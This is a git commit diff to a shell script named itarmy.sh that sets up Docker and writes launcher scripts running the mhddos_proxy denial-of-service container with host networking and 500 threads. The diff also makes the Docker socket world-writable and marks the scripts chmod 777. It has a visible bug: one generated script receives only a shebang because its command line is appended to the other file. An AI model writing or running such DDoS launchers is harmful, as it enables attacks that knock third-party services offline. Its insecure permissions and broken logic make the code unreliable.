f8210ff4987494b923b77d3da78ecb8fba222e78
Andrii Androsovych <55437123+aaw20904@users.noreply.github.com>
2023-04-01 12:20:26 +0300

    Update itarmy.sh

--- itarmy.sh
+++ itarmy.sh
@@ -31,7 +31,11 @@ sudo systemctl unmask docker.socket
 sudo systemctl start docker.service 
 sudo chmod 666 /var/run/docker.sock 
 sudo docker run hello-world
-touch attack.sh
-echo "#!/bin/bash" > attack.sh
-echo "docker run -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" > attack.sh
-chmod 777 attack.sh
+echo "#!/bin/bash" >> attackd.sh
+echo "docker run -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attack.sh
+sudo chmod 777 attackd.sh
+echo "#!/bin/bash" >> attack.sh
+echo "docker run  -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attack.sh
+sudo chmod 777 attack.sh
+
+
